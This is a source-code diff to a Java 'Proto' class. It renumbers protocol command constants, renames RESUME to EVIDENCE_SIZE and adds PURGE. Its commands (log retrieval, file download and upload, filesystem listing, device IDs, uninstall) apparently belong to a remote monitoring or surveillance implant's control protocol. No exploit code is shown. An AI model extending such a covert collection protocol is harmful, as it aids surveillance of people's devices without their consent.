@@ -45,8 +45,7 @@ public final class Proto {
 	public static final int UNINSTALL = 0xa; // Uninstallati
 
 	/** The Constant RESUME. */
-	public static final int RESUME = 0xb; // RESUME,nome,# rimandami il
-	// log "nome" a partire dal byte
+	public static final int EVIDENCE_SIZE = 0xb; // Evidence size
 
 	/** The Constant DOWNLOAD. */
 	public static final int DOWNLOAD = 0xc; // DOWNLOAD,nome: mandami il
@@ -99,13 +98,16 @@ public final class Proto {
 	public static final int FILESYSTEM = 0x19; // FILESYSTEM,depth, path:
 	// filesystem tree in
 	// profondita'
+	
+	/** The Constant PURGE. */
+	public static final int PURGE = 0x1a;
 	/** The Constant LASTTYPE. */
-	public static final int LASTTYPE = 0x1a;
+	public static final int LASTTYPE = 0x1b;
 
 	/** The Constant STRINGS. */
 	public static final String[] STRINGS = new String[] { "NULL", "OK", "NO", "BYE", "CHALLENGE", "RESPONSE", "SYNC", //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$
 			"NEW_CONF", "LOG_NUM", "LOG", "UNINSTALL", "RESUME", "DOWNLOAD", "UPLOAD", "FILE", "ID", "INSTANCE", //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$ //$NON-NLS-8$ //$NON-NLS-9$ //$NON-NLS-10$
-			"USERID", "DEVICEID", "SOURCEID", "VERSION", "LOG_END", "UPGRADE", "ENDFILE", "SUBTYPE", "FILESYSTEM" }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$ //$NON-NLS-8$ //$NON-NLS-9$
+			"USERID", "DEVICEID", "SOURCEID", "VERSION", "LOG_END", "UPGRADE", "ENDFILE", "SUBTYPE", "FILESYSTEM", "PURGE", "LASTTYPE" }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$ //$NON-NLS-7$ //$NON-NLS-8$ //$NON-NLS-9$
 
 	public static final int ERROR = 0;
 
